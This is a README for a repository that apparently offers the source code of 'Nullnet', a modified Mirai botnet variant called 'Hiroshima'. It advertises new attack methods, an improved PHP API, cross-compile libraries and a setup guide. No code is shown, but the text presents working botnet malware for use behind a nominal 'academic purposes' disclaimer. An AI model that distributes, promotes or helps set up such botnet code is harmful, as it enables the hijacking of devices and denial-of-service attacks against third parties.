## nullnet
Nullnet Mirai Botnet (Hiroshima)

## Info about source



./cnc 
cnc 1487
botport


This is the source code that was originally created by Anna-senpai author called Mirai, then it has been edited many times and this is one of the versions in circles called "Hiroshima"

I had access and work on Hiroshima to edit and improve, this source code, bins and other things have changed names, the API script with php works much better now. With some more changes

Of course, this code is quite old, it is even still sold on the Telegram and Shopify platforms, so be careful what you buy and who you buy it from.

What this source code offers you is a couple of new methods, changed design, improved API (php), you have all the files for cross compile in the folder '/libs'. And some other changes, etc..

## How to use it?
It is fully explained to you (for Centos 7 device platform) in the setup.txt file

## Credits
Anna-senpai, Busybox

## Disclaimer
This repository is for academic purposes, the use of this software is your responsibility.

## Virus Warn
The download file for this repo is being identified by some AV programs as malware. Please take caution.
